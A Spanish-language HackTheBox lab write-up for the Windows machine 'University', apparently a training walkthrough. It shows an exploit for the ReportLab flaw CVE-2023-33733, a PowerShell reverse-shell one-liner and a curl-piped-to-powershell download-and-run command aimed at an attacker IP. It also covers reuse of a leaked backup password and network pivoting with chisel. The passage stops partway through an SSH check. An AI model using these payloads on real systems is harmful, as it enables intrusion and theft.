---
title: University - Insane (HTB)
permalink: /University-HTB-Writeup/
tags:
  - "Windows"
  - "Insane"
  - "RCE"
  - "CVE-2023-33733"
  - "Credentials Leakage"
  - "Pivoting"
  - "Chisel"
  - "Proxychains"
  - "Information Leakage"
  - "X509 Certificate"
  - "Phishing"
  - "RBCD"
  - "NTLM Relay"
  - "Rubeus"
  - "TGT Extraction"
  - "PassTheTicket"
  - "ACL Rights"
  - "ReadGMSAPassword"
categories:
  - writeup
  - hacking
  - hackthebox
  - "active directory"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
seo_tittle: University - Insane (HTB)
seo_description: Explota CVE-2023-33733, pivota a una red interna, realiza un ataque de Phishing, abusa de la delegación Kerberos y más para vencer University.
excerpt: Explota CVE-2023-33733, pivota a una red interna, realiza un ataque de Phishing, abusa de la delegación Kerberos y más para vencer University.
header:
  overlay_image: /assets/images/headers/university-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/university-hackthebox.jpg
---


![image-center](/assets/images/posts/university-hackthebox.png)
{: .align-center}

**Habilidades:** RCE in `ReportLab` PDF Toolkit (CVE-2023-33733), Credentials Leakage, Domain Analysis with Bloodhound, Network Pivoting - (`chisel` + `proxychains`), Internal Network Scanning, Information Leakage, Build X.509 Certificate, Abusing RBCD (Resource-Based Constrained Delegation)  + NTLM Relay, Kerberos Client Setup, Ticket Extraction (`Rubeus.exe`), PassTheTicket, Abusing ACL Rights - `ReadGMSAPassword`, RBCD
{: .notice--primary}

# Introducción

University es una máquina Windows de dificultad `Insane` en HTB en la que se nos presenta un escenario de Active Directory el cual debemos comprometer a través de diversas técnicas de explotación a servicios. Comenzaremos vulnerando un servicio web con un CVE, para posteriormente movernos lateralmente en un camino que no está del todo claro hasta abusar de la delegación `kerberos` y conseguir privilegios elevados dentro del dominio.
<br>

# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.11.39    
PING 10.10.11.39 (10.10.11.39) 56(84) bytes of data.
64 bytes from 10.10.11.39: icmp_seq=1 ttl=127 time=214 ms

--- 10.10.11.39 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 214.359/214.359/214.359/0.000 ms
~~~


## Nmap Scanning 

Comenzaremos realizando un escaneo que identifique +únicamente puertos abiertos en la máquina víctima. Primeramente utilizaremos el protocolo TCP

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.39 -oG openPorts 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-10 12:25 EDT
Nmap scan report for 10.10.11.39
Host is up (0.22s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49678/tcp open  unknown
49682/tcp open  unknown
49703/tcp open  unknown
52769/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 19.04 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Hemos descubierto una gran cantidad de servicios de Active Directory, por lo que podemos intuir que estamos frente a un controlador de Dominio. Realizaremos un segundo escaneo a los puertos abiertos que hemos descubierto con el propósito de identificar la versión y los servicios que se ejecutan

~~~ bash
nmap -p 53,80,88,135,139,389,445,464,593,636,2179,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49676,49677,49678,49682,49703,52769 -sVC 10.10.11.39 -oN services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-10 12:40 EDT
Nmap scan report for 10.10.11.39
Host is up (0.22s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          nginx 1.24.0
|_http-title: Did not follow redirect to http://university.htb/
|_http-server-header: nginx/1.24.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-10 23:40:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
52769/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m51s
| smb2-time: 
|   date: 2025-07-10T23:41:13
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.48 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Vemos que existe un servicio web en el puerto `80`, además de que el servidor nos intenta redirigir a `university.htb`, el cual es el nombre del dominio (confirmado por el servidor LDAP). 

Agregaremos el dominio a nuestro archivo `/etc/hosts` para poder aplicar una resolución DNS correctamente

~~~ bash
cat /etc/hosts | grep university.htb

10.10.11.39 university.htb DC.university.htb
~~~


## Web Analysis - Student

Podemos realizar un escaneo de las tecnologías web que el servidor pueda estar utilizando 

~~~ bsah
whatweb http://university.htb

http://university.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@university.htb], Frame, HTML5, HTTPServer[nginx/1.24.0], IP[10.10.11.39], JQuery, Script, Title[University], UncommonHeaders[x-content-type-options,referrer-policy,cross-origin-opener-policy], X-Frame-Options[DENY], nginx[1.24.0]
~~~

Vemos que se utiliza `nginx` además de `Bootstrap` para presentar el contenido. Al navegar hasta `university.htb`, veremos la siguiente web

![image-center](/assets/images/posts/university-web.png)
{: .align-center}

En la barra superior, podemos ver enlaces que nos redirigen a tipos de cuenta `Student` o `Professor`

![image-center](/assets/images/posts/university-web-2.png)
{: .align-center}

Cada enlace nos permite registrar un tipo de cuenta

~~~ bash
http://university.htb/student/register/
http://university.htb/professor/register/
~~~

En mi caso he registrado una cuenta del tipo `Student` para ingresar a la plataforma, ya que **una cuenta de profesor requiere activación**

![image-center](/assets/images/posts/university-web-3.png)
{: .align-center}

### Login using a Signed Certificate

Existe una opción que nos permite solicitar un certificado firmado e iniciar sesión

![image-center](/assets/images/posts/university-web-4.png)
{: .align-center}

Para hacer esto, debemos enviar un archivo `.csr`, y el DC emitirá un archivo `.pem`

![image-center](/assets/images/posts/university-web-5.png)
{: .align-center}

> Un archivo CSR o (`Certificate Signing Request`), es un mensaje codificado que contiene información clave para **solicitar un certificado digital**, como un certificado SSL/TLS
{: .notice--info}

> Un archivo `.pem`, es un formato de archivo de texto utilizado comúnmente para **almacenar datos criptográficos, como certificados digitales, claves públicas y claves privadas.**
{: .notice--info}

Si queremos generar este archivo, necesitaremos especificar la información que utilizamos para registrar al usuario (`username` y `email`)

~~~ bash
openssl req -newkey rsa:2048 -keyout PK.key -out My-CSR.csr

Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:andrew
Email Address []:test@test.com
 
Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
~~~

Al enviar este archivo que generamos a la web, se creará un archivo `signed-cert.pem`. Si inspeccionamos si contenido vemos que corresponde al certificado digital

~~~ bash
openssl x509 -in signed-cert.pem -text  
Certificate:
    Data:
        Version: 1 (0x0)
        Serial Number:
            6a:6b:3b:65:3f:ba:7d:80:be:10:8f:98:24:fa:1f:2e:bf:50:23:43
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C = UK, ST = Some-State, O = University Ltd, CN = university.htb, emailAddress = headadmin@university.htb
        Validity
            Not Before: Aug  8 20:12:15 2025 GMT
            Not After : Sep  7 20:12:15 2025 GMT
        Subject: C = AU, ST = Some-State, O = Internet Widgits Pty Ltd, CN = andrew, emailAddress = test@test.com
        Subject Public Key Info:
~~~

Ahora podremos iniciar sesión desde `http://university.htb/accounts/login/SDC/` con este archivo `.pem`

![image-center](/assets/images/posts/university-web-6.png)
{: .align-center}

### Profile Export

Una vez estamos registrados, es posible exportar la información de nuestro perfil desde el siguiente menú desplegable 

![image-center](/assets/images/posts/university-web-7.png)
{: .align-center}


## PDF File Analysis

A continuación vemos que se genera un archivo `profile.pdf` con la información de nuestro perfil

![image-center](/assets/images/posts/university-web-8.png)
{: .align-center}

Analizando los caracteres imprimibles del `PDF`, podemos ver que se emplea `ReportLab PDF Toolkit` en su versión `1.4`

~~~ bash
strings profile.pdf                           

%PDF-1.4
 ReportLab Generated PDF document http://www.reportlab.com
...
...
...
~~~
<br>


# Intrusión / Explotación
---
## CVE-2023-33733 - RCE in `ReportLab` PDF Toolkit via Sandbox Bypassing

Esta es una vulnerabilidad crítica que afecta a la biblioteca de Python `ReportLab` en sus versiones anteriores a `3.6.13`. Permite ejecución de comandos en el sistema mediante la manipulación de archivos PDF.

> `ReportLab` es una biblioteca de Python de código abierto diseñada para generar documentos PDF de forma programática. Permite crear PDF dinámicos y complejos desde cero, incluyendo elementos como texto, gráficos, tablas y más.
{: .notice--info}

### Understanding Vulnerability

`ReportLab` implementó un sandbox llamado `__rl_safe_eval__`. Este incluye todas las funciones `built-in` de Python e incluye varias funciones incorporadas anuladas. Esta función implementa varias condiciones para garantizar que el atributo invocado sea seguro antes de usar la función `getAttr()`.
<br>
La idea es crear una nueva clase llamada `Word` que herede de `str` que, cuando se pase al `getattr()` personalizado, eluda las comprobaciones del sandbox en la función `__rl_is_allowed_name__`

~~~ python
def __rl_is_allowed_name__(self, name):
		"""Check names if they are allowed.
		If ``allow_magic_methods is True`` names in `__allowed_magic_methods__`
		are additionally allowed although their names start with `_`.
		"""
		if isinstance(name,strTypes):
			if name in __rl_unsafe__ or (name.startswith('__')
				and name!='__'
				and name not in self.allowed_magic_methods):
				raise BadCode('unsafe access of %s' % name)
~~~

Los [detalles técnicos](https://github.com/c53elyas/CVE-2023-33733?tab=readme-ov-file#the-bug) señalan que la clase debe presentar el siguiente comportamiento

~~~ python
Word = type('Word', (str,), {
            'mutated'   : 1,
            'startswith': lambda self, x: False,
            '__eq__'    : lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x,
            'mutate'    : lambda self: {setattr(self, 'mutated', self.mutated - 1)},
            '__hash__'  : lambda self: hash(str(self))
            })
code = Word('__code__')
print(code == '__code__')    ## prints False
print(code == '__code__')    ## prints True
print(code == '__code__')    ## prints True
print(code == '__code__')    ## prints True

print(code.startswith('__')) ## prints False
~~~

- Cuando el sandbox verifica `startswith('__')`, siempre obtiene `False`
- La primera comparación falla porque retorna `False`
- Las siguientes comparaciones retornan `True`, esto permite eludir las comprobaciones y acceder a `__code__`

Un atacante puede construir un payload a través del atributo `color` en etiquetas HTML, la cual puede evaluarse como una función de Python y lograr ejecución de comandos a nivel de sistema eludiendo el sandbox.

La siguiente [prueba de concepto](https://github.com/c53elyas/CVE-2023-33733?tab=readme-ov-file#what-else) utiliza el atributo `color` de una etiqueta `<font>` y hace un llamado al módulo `os` para ejecutar un comando a nivel de sistema a través de la función `system()`

~~~ xml
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
                exploit
</font></para>
~~~

### Exploiting

Copiaremos un recurso de `powershell` que nos envíe una consola interactiva, podemos encontrar fácilmente recursos desde el siguiente repositorio en [Gtihub](https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcpOneLine.ps1). En mi caso, dispongo del recurso en mi máquina

~~~ bash
cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 reverse.ps1
~~~

Adaptaremos el script para cambiar la IP y asignar un puerto que deseemos, en mi caso he elegido el `443`

> `rev.ps1`

~~~ powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.15.30',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
~~~

Modificaremos el payload para que haga una solicitud HTTP a nuestro recurso `rev.ps1` y lo ejecute con `powershell`, en teoría deberíamos obtener una shell como el usuario que ejecuta el servicio web

~~~ xml
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('curl http://10.10.15.30/rev.ps1 | powershell') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
                exploit
</font></para>
~~~

Enviaremos el payload en el campo `Bio` y haremos clic en `Submit`, la web se recargará automáticamente

![image-center](/assets/images/posts/university-rce.png)
{: .align-center}

Iniciaremos un listener para recibir la consola desde Windows con `rlwrap`, debemos utilizar el mismo puerto que elegimos en el payload

~~~ bash
rlwrap -cAr nc -lvnp 443
~~~

También iniciaremos un servidor HTTP para que la máquina víctima pueda encontrar nuestro recurso `rev.ps1`

~~~ bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~

Luego de actualizar los datos, debemos hacer en `Export Profile` para que pueda acontecerse el RCE

![image-center](/assets/images/posts/university-rce-2.png)
{: .align-center}

Desde nuestro servidor HTTP veremos que se ha realizado una solicitud al archivo `rev.py`

~~~ bash
10.10.11.39 - - [07/Aug/2025 21:48:42] "GET /rev.ps1 HTTP/1.1" 200 -
~~~


## Shell as `wao` - `DC`

Desde nuestro listener deberíamos recibir una consola de `powershell` como el usuario `wao`

~~~ bash
rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.15.30] from (UNKNOWN) [10.10.11.39] 50498

# Press ENTER
PS C:\Web\University> whoami
university\wao
PS C:\Web\University>
~~~


## Interesting Files

Nos encontramos en la carpeta `C:\Web\University`, donde parecen almacenarse recursos que el servidor web utiliza

~~~ bash
PS C:\Web\University> dir
    Directory: C:\Web\University

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----
d-----        2/15/2024   8:13 AM                CA
d-----        2/19/2024   3:54 PM                static 
d-----       10/15/2024  11:42 AM                University
-a----         8/8/2025   1:48 AM           5358 ab3We3.html
-a----         8/8/2025   1:48 AM              0 ab3We3.pdf
-a----         8/8/2025   1:53 AM           5369 Ct9RHf.html
-a----         8/8/2025   1:53 AM              0 Ct9RHf.pdf
-a----         8/8/2025   3:37 AM         245760 db.sqlite3
-a----        12/3/2023   4:28 AM            666 manage.py
-a----        2/15/2024  12:51 AM            133 start-server.bat
~~~

Podríamos intentar analizar el archivo de base de datos `.sqlite3`. Sin embargo, algo más interesante se encuentra en la carpeta `DB Backups`

~~~ bash
PS C:\Web\University> cd ..
PS C:\Web> dir

    Directory: C:\Web

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/25/2024   4:53 PM                DB Backups
d-----        2/12/2024   4:54 PM                nginx-1.24.0
d-----         8/8/2025   5:25 PM                University                                     

PS C:\Web> dir "DB Backups"

    Directory: C:\Web\DB Backups

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/25/2023  12:03 AM          24215 DB-Backup-2023-01-25.zip
-a----        2/25/2023  12:03 AM          24215 DB-Backup-2023-02-25.zip
-a----        3/25/2023  12:03 AM          24215 DB-Backup-2023-03-25.zip
-a----        4/25/2023  12:04 AM          24215 DB-Backup-2023-04-25.zip
-a----        5/25/2023  12:04 AM          24215 DB-Backup-2023-05-25.zip
-a----        6/25/2023  12:04 AM          24215 DB-Backup-2023-06-25.zip
-a----        7/25/2023  12:04 AM          24215 DB-Backup-2023-07-25.zip
-a----        8/25/2023  12:04 AM          24215 DB-Backup-2023-08-25.zip
-a----        9/25/2023  12:05 AM          24215 DB-Backup-2023-09-25.zip
-a----       10/25/2023  12:05 AM          24215 DB-Backup-2023-10-25.zip
-a----       11/25/2023  12:05 AM          24215 DB-Backup-2023-11-25.zip
-a----       12/25/2023  12:05 AM          24215 DB-Backup-2023-12-25.zip
-a----        1/25/2024  12:06 AM          24215 DB-Backup-2024-01-25.zip
-a----        2/25/2024  12:06 AM          24215 DB-Backup-2024-02-25.zip
-a----        3/25/2024  12:07 AM          24215 DB-Backup-2024-03-25.zip
-a----        4/25/2024  12:07 AM          24215 DB-Backup-2024-04-25.zip
-a----       10/14/2024   9:35 AM            386 db-backup-automator.ps1 
~~~


## Credentials Leakage

Si consultamos el contenido del script `db-backup-automator.ps1`, veremos que realiza una copia de seguridad de la base de datos con `7z.exe`. El comando usa una contraseña para realizar el `Backup` 

~~~ bash
PS C:\Web> type "DB Backups\db-backup-automator.ps1"

$sourcePath = "C:\Web\University\db.sqlite3"
$destinationPath = "C:\Web\DB Backups\"
$7zExePath = "C:\Program Files\7-Zip\7z.exe"

$zipFileName = "DB-Backup-$(Get-Date -Format 'yyyy-MM-dd').zip"
$zipFilePath = Join-Path -Path $destinationPath -ChildPath $zipFileName
$7zCommand = "& `"$7zExePath`" a `"$zipFilePath`" `"$sourcePath`" -p 'WebAO1337'"
~~~

Para descubrir rápidamente para qué usuario es válida esta contraseña, realizaremos `Password Spraying` al listado de usuarios que generamos anteriormente

~~~ bash
nxc smb DC.university.htb -u users.txt -p 'WebAO1337' --continue-on-success | grep '[+]'

SMB                      10.10.11.39     445    DC               [+] university.htb\WAO:WebAO1337
~~~


## Domain Analysis

En este punto disponemos de unas credenciales que podemos utilizar para recolectar información del dominio. Utilizaremos BloodHound para analizar vectores potenciales de explotación y escalada de privilegios. 

En vez de subir `SharpHound.exe` al DC, alternativamente podemos utilizar `bloodhound-python` con la cuenta que disponemos

~~~ bash
bloodhound-python -d university.htb -u wao -p 'WebAO1337' -ns 10.10.11.39 -c All --zip
~~~

### Remote Management Users

Consultando en BloodHound los grupos a los que el usuario `wao` pertenece, veremos que forma parte del grupo `Remote Management Users`

> En Active Directory (AD), el grupo «Usuarios de administración remota» o `Remote Management Users` es un grupo integrado que otorga a sus miembros la capacidad de administrar de forma remota los controladores de dominio.
{: .notice--info}

![image-center](/assets/images/posts/university-bloodhound.png)
{: .align-center}

Si inspeccionamos los miembros de este grupo, veremos a los demás usuarios que tienen la misma capacidad

![image-center](/assets/images/posts/university-bloodhound-2.png)
{: .align-center}

En teoría tenemos la capacidad de operar con una consola de `powershell` a través del protocolo WinRM. Para conectarnos al Domain Controller con `evil-winrm`, aunque también existen alternativas como [`evil-winrm-py`](https://github.com/adityatelange/evil-winrm-py)

~~~ bash
evil-winrm-py -i DC.university.htb -u wao -p 'WebAO1337'                 
        ▘▜      ▘             
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v1.1.2
[*] Connecting to DC.university.htb:5985 as wao
evil-winrm-py PS C:\Users\WAO\Documents>
~~~

### Domain Users

Ahora somos capaces de generar un listado rápido de usuarios con la herramienta `rpcclient` y aplicando una serie de filtros

~~~ bash
rpcclient DC.university.htb -U "wao%WebAO1337" -c enumdomusers | cut -d ' ' -f1-1 | grep -oP '\[.*?\]' | tr -d '[]' > users.txt 
~~~

### Network Interfaces

Si listamos las interfaces de red, veremos que cuenta con una interfaz interna que tiene otra dirección IP asignada. Esto claramente significa que el DC se conectar con más equipos de forma aislada que aún no conocemos

~~~ bash
evil-winrm-py PS C:\Web\University> ipconfig

Windows IP Configuration


Ethernet adapter vEthernet (Internal-VSwitch1):

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::47c0:fbc9:2d7b:e4bb%6
   IPv4 Address. . . . . . . . . . . : 192.168.99.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::26bf:d355:2d06:e5
   Link-local IPv6 Address . . . . . : fe80::f3c0:4348:d078:7bc1%4
   IPv4 Address. . . . . . . . . . . : 10.10.11.39
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:1b7d%4
                                       10.10.10.2
~~~

### Domain Computers

Si realizamos una consulta básica desde `powershell` para listar los equipos y sus direcciones IP, veremos los siguientes

~~~ bash
evil-winrm-py PS C:\Users\WAO\Documents> Get-ADComputer -Filter * -Properties * | ft  Name,IPv4Address

Name         IPv4Address  
----         -----------  
DC           10.10.11.39  
WS-3         192.168.99.2 
WS-1                      
WS-2                      
WS-4                      
WS-5                      
LAB-2        192.168.99.12
SETUPMACHINE 10.10.10.4 
~~~


## Network Pivoting - `chisel` + `proxychains`

Realizaremos un reenvío de puertos desde el DC a nuestra máquina atacante con el propósito de alcanzar equipos a los que no tenemos acceso directamente, de forma que usaremos el DC como proxy para poder identificar nuevos hosts en esta nueva red interna. 

Subiremos el binario compilado de `chisel` al Domain Controller aprovechando la consola de `evil-winrm-py`

~~~ bash
evil-winrm-py PS C:\Programdata> upload chisel.exe .
~~~

Iniciaremos un servidor con `chisel` por un puerto determinado, en mi caso he elegido el `8000`. 

>Procura que ambos ejecutables sean de la **misma versión**, porque sino, podrías experimentar problemas a la hora de establecer un túnel
{: .notice--danger}

~~~ bash
./chisel server -p 8000 --reverse

2025/08/08 12:32:29 server: Reverse tunnelling enabled
2025/08/08 12:32:29 server: Fingerprint 080apaIhsKA6RJHT/4FT0VguhblooAZz0vx8qIE2XVc=
2025/08/08 12:32:29 server: Listening on http://0.0.0.0:8000
~~~

Nos conectaremos desde el DC en modo cliente a nuestro servidor HTTP que ha iniciado `chisel`, utilizaremos la opción `R:socks` para reenviar puertos dinámicamente

~~~ powershell
evil-winrm-py PS C:\Programdata> .\chisel.exe client 10.10.15.30:8000 R:socks
~~~

Desde el servidor de `chisel` deberíamos ver cómo se establece un nuevo túnel SOCKS por el puerto `1080`

~~~ bash
2025/08/08 12:33:37 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
~~~

### Proxychains Config

Ahora podemos utilizar `proxychains` como nuestro canal de comunicación con la red interna del Controlador de Dominio. Debemos comprobar la configuración en `/etc/proxychains.conf`, donde debemos habilitar `strict_chain` y establecer el puerto `1080` con un proxy tipo `socks5`

~~~ bash
cat /etc/proxychains.conf | grep -E "socks5|strict" 

strict_chain
#            	socks5	192.168.67.78	1080	lamer	secret
#       proxy types: http, socks4, socks5
#socks5	127.0.0.1 9050
socks5 127.0.0.1 1080
~~~


## Hosts Discovery - Scanning Internal Network

Con la configuración aplicada, realizaremos un escaneo básico a los puertos más comunes que puedan estar abiertos en los equipos (solamente con el propósito de agilizar el proceso), además de incluir el puerto `22` por si hay algún host que admita SSH. 

En el siguiente ejemplo reduje la cantidad de host a `16` al establecer la máscara de subred en la **notación CIDR**

~~~ bash
proxychains -q nmap -sT --open -p 22,80,135,139,445,5985 -Pn -n 192.168.99.0/28 -oN internal_hosts

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-08 14:04 EDT
Nmap scan report for 192.168.99.1
Host is up (0.68s latency).
Not shown: 1 closed tcp port (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  wsman

Nmap scan report for 192.168.99.2
Host is up (1.3s latency).
Not shown: 2 closed tcp ports (conn-refused)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  wsman

Nmap scan report for 192.168.99.12
Host is up (1.6s latency).
Not shown: 5 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 16 IP addresses (16 hosts up) scanned in 1225.32 seconds
~~~

- `-sT`: TCP Connect Scan, realiza el `3 Way Handshake`, o sea, el intercambio de paquetes de forma completa con el objetivo

> Es necesario utilizar esta opción ya que `nmap` podría mostrar puertos abiertos como filtrados al enviar paquetes `raw` o incompletos por la naturaleza del escaneo SYN. Los proxies `SOCKS` solamente soportan conexiones completas. 
{: .notice--warning}

 `nmap` suele utilizar el escaneo SYN por defecto cuando estamos con un usuario privilegiado, y si no lo estamos, necesitamos hacer uso de `sudo`. A continuación 

~~~ bash
sudo proxychains -q nmap -p 445 -Pn -n 192.168.99.2 -v

Initiating SYN Stealth Scan at 00:55
...

PORT    STATE    SERVICE      REASON
445/tcp filtered microsoft-ds no-response


# Cuando utilizamos TCP Connect Scan
sudo proxychains -q nmap -sT -p 445 -Pn -n 192.168.99.2 -v

Initiating Connect Scan at 00:48
...

PORT    STATE SERVICE      REASON
445/tcp open  microsoft-ds syn-ack

~~~

Vemos nuevos hosts, concretamente `192.168.99.2` y `192.168.99.12`, donde uno parece ser un equipo Windows por los puertos abiertos, mientras que la IP `.12` tiene el puerto `22` abierto


## Shell as `wao` - `WS-3`

Aprovechando el túnel SOCKS y el puerto `5985` (WinRM) de la IP `192.168.99.2`, podremos conectarnos con el usuario `wao` a este equipo

~~~ bash
proxychains -q evil-winrm-py -i 192.168.99.2 -u wao -p 'WebAO1337'                                        
        ▘▜      ▘             
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v1.1.2
[*] Connecting to 192.168.99.2:5985 as wao
evil-winrm-py PS C:\Users\wao\Documents> whoami
university\wao
evil-winrm-py PS C:\Users\wao\Documents> hostname
WS-3
~~~

Encontraremos el siguiente mensaje en un archivo `README.txt` haciendo referencia a que ciertos equipos no se actualizan desde `2023`, además de sugerirnos cambiar a `WS-4` y `WS-5`

~~~ powershell
evil-winrm-py PS C:\Users\wao\Documents> type ..\Desktop\README.txt
Hello Professors.
We have created this note for all the users on the domain computers: WS-1, WS-2 and WS-3.
These computers have not been updated since 10/29/2023.
Since these devices are used for content evaluation purposes, they should always have the latest security updates.
So please be sure to complete your current assessments and move on to the computers "WS-4" and "WS-5".
The security team will begin working on the updates and applying new security policies early next month.
Best regards.
Help Desk team - Rose Lanosta.
~~~


## Shell as `wao` - `LAB-2`

Respecto al equipo `192.168.99.2` que tiene el puerto `22` abierto, una comprobación con las credenciales del usuario `wao` valida el acceso. Vemos que se trata de una máquina Linux y disponemos de los privilegios `sudo` suficientes para ser `root`

~~~ bash
proxychains -q nxc ssh 192.168.99.2/28 -u wao -p 'WebAO1337' --sudo-check 
SSH         192.168.99.12   22     192.168.99.12    [*] SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7
